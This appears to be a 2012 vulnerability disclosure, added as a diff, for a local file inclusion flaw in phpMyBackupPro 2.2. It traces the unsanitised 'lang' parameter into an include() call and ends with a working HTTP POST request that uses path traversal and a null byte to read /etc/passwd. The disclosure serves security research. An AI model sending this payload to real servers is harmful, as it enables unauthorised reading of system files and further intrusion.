@@ -1,0 +1,58 @@
+  :::::::-.   ...    ::::::.    :::.
+   ;;,   `';, ;;     ;;;`;;;;,  `;;;
+   `[[     [[[['     [[[  [[[[[. '[[
+    $$,    $$$$      $$$  $$$ "Y$c$$
+    888_,o8P'88    .d888  888    Y88
+    MMMMP"`   "YmmMMMM""  MMM     YM
+	
+   [ Discovered by dun \ posdub[at]gmail.com ]
+   [ 2012-07-03                              ]
+ ##################################################################
+ # [ phpMyBackupPro <= 2.2 ]  Local File Inclusion Vulnerability  #
+ ##################################################################
+ #
+ # Script: "phpMyBackupPro is a very easy to use, free, web-based
+ #          MySQL backup application, licensed under the GNU GPL."
+ #
+ # Vendor:   http://www.phpmybackuppro.net/
+ # Download: http://sourceforge.net/projects/phpmybackup/files/phpMyBackupPro/
+ #
+ #
+ # File: ./phpMyBackupPro-2.2/config.php (line: 26)
+ #  ..cut..
+ #  26    require_once("login.php");                                                 // 1
+ #  ..cut..
+ #
+ # File: ./phpMyBackupPro-2.2/login.php (line: 29)
+ #  ..cut..
+ #  29    require_once("definitions.php");                                           // 2
+ #  ..cut..
+ #
+ # File: ./phpMyBackupPro-2.2/definitions.php (lines: 201-206)
+ #  ..cut..
+ #  201    // check if language was just changed in config.php
+ #  202    if (isset($_POST['lang']) && preg_replace("#.*/#","",$_SERVER['PHP_SELF'])=="config.php") $CONF['lang']=$_POST['lang']; // 3
+ #  203
+ #  204    // include language.inc.php
+ #  205    if (!isset($CONF['lang'])) $CONF['lang']="english";
+ #  206    if (!file_exists($prepath.PMBP_LANGUAGE_DIR.$CONF['lang'].".inc.php"))    // 4
+ #           include_once($prepath.PMBP_LANGUAGE_DIR."english.inc.php");             // 4
+ #           else include($prepath.PMBP_LANGUAGE_DIR.$CONF['lang'].".inc.php");      // 4 [LFI]
+ #  ..cut..
+ #
+ #
+ # [LFI] ( magic_quotes_gpc = Off; )
+ # Vuln:
+ #
+ #  POST /phpMyBackupPro-2.2/config.php HTTP/1.1
+ #  Host: localhost
+ #  User-Agent: Mozilla/5.0
+ #  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+ #  Accept-Language: pl,en-us;q=0.7,en;q=0.3
+ #  Accept-Encoding: gzip, deflate
+ #  Connection: keep-alive
+ #  Content-Type: application/x-www-form-urlencoded
+ #  Content-Length: 39
+ #  lang=../../../../../../../etc/passwd%00
+ #
+ ### [ dun / 2012 ] #####################################################
